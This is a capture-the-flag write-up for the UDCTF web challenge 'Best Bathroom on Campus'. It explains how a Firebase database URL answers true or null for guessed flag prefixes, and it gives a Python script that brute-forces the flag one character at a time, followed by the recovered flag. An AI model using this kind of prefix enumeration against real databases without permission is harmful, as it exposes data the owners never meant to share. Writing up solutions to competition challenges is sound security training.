# BLUE HENS UDCTF
## Best Bathroom on Campus
![attached image](bestbathroom.png)
https://best-bathroom-default-rtdb.firebaseio.com/flag/UDCTF.json

```category: WEB```
```challange points: 100```

we have only given the URL as we open this a string ```true``` is written. Point of writing ```true``` here is that something is correct right now , ```UDCTF``` in url giving thought of flag format. I put an extra curly bracket ```UDCTF{``` in URL it's still ```true``` then i put random character ```UDCTF{a``` , now string come as ```Null``` .Also image attached in Description also indicating that its correct till```UDCTF{``` and we have to find further and URL will check if flag is correct then it prints ```true``` otherwise prints ```Null```.
So i wrote a exploit to bruteforce character....
```python
import requests
import string

base_url = "https://best-bathroom-default-rtdb.firebaseio.com/flag/UDCTF{"
last_url = ".json"
characters = "1_'?#@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

while True:
    found = False
    for character in characters:
        url = f"{base_url}{character}{last_url}"
        response = requests.get(url)
        if "true" in response.text:
            print(f"here: {character}")
            base_url += character
            found = True
        else:
            continue        
```

this script tries bruteforcing of characters at end of ```UDCTF{``` and if ```true``` is found in response it will brute characters again at next place.    
and this script prints flag as :
**UDCTF{1ce_L4br4t0ry_s3C0nd_Fl0or_b0y's_b4thr00m}**


